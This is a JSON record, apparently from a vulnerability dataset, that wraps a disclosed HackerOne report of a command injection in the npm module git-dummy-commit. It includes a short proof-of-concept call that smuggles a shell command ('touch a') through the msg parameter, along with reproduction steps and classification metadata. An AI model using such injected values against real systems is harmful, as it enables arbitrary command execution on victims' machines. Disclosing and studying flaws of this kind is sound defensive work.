{
  "reported_to": "Node.js third-party modules",
  "reported_by": "caioluders ",
  "title": "[git-dummy-commit] Command injection on the msg parameter",
  "content": "\nHi there, I've found a Command Injection on the \"git-dummy-commit\" module.\nModule\nmodule name: git-dummy-commit\nversion: 1.3.0\nnpm page: https://www.npmjs.com/package/git-dummy-commit\nModule Description\nCreate a dummy commit for testing\nModule Stats\n[62] downloads in the last day\n[94] downloads in the last week\n[384] downloads in the last month\n[6078] downloads in the last year\nVulnerability\nVulnerability Description\nThe module appends the msg parameter to a command on the line 37 without escaping it, leading to a command injection.\nSteps To Reproduce:\nInstall the module\nCode 30 Bytes\n1$ npm install git-dummy-commit\nExample code with the malicious payload \";touch a;\" on line 3.\nCode 83 Bytes\n1const gitDummyCommit = require('git-dummy-commit');\n2\n3gitDummyCommit('\";touch a;\"');\nRun it.\nCode 15 Bytes\n1$ node index.js\nCheck the newly create file a\nCode 16 Bytes\n1$ ls\n2a\t\tindex.js\nPatch\nIt is advisable to use a module that explicitly isolates the parameters to the git command.\n( contacted the maintainer || opened issue ) = False\nImpact\nAn attacker that controls the msg parameter can injection command on the victim's machine.\n\n",
  "severity": [
    10.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1529114340,
  "report_url": "https://hackerone.com/reports/341710",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the module: npm install git-dummy-commit"
    ],
    [
      2,
      "Create an index.js file with the following content:\nconst gitDummyCommit = require('git-dummy-commit');\ngitDummyCommit('\"touch a\"');"
    ],
    [
      3,
      "Run the script: node index.js"
    ],
    [
      4,
      "Check for the newly created file 'a' in the directory: ls"
    ]
  ],
  "vuln_description": "The git-dummy-commit module is vulnerable to command injection via the 'msg' parameter, which is appended to a command without proper escaping. This allows an attacker to execute arbitrary commands on the victim's machine by controlling the 'msg' parameter.",
  "reason": "The vulnerability is straightforward to discover as it involves a direct command injection through a single parameter without any complex interactions or state manipulations. The attack vector is simple and well-known in security testing.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection in a Node.js module, which is unrelated to authentication or authorization (AuthN/AuthZ) boundaries. The proposed methodologies focus on testing AuthN/AuthZ vulnerabilities by manipulating user sessions and resource access, not command injection vulnerabilities in software modules.",
    "is_detectable": false
  }
}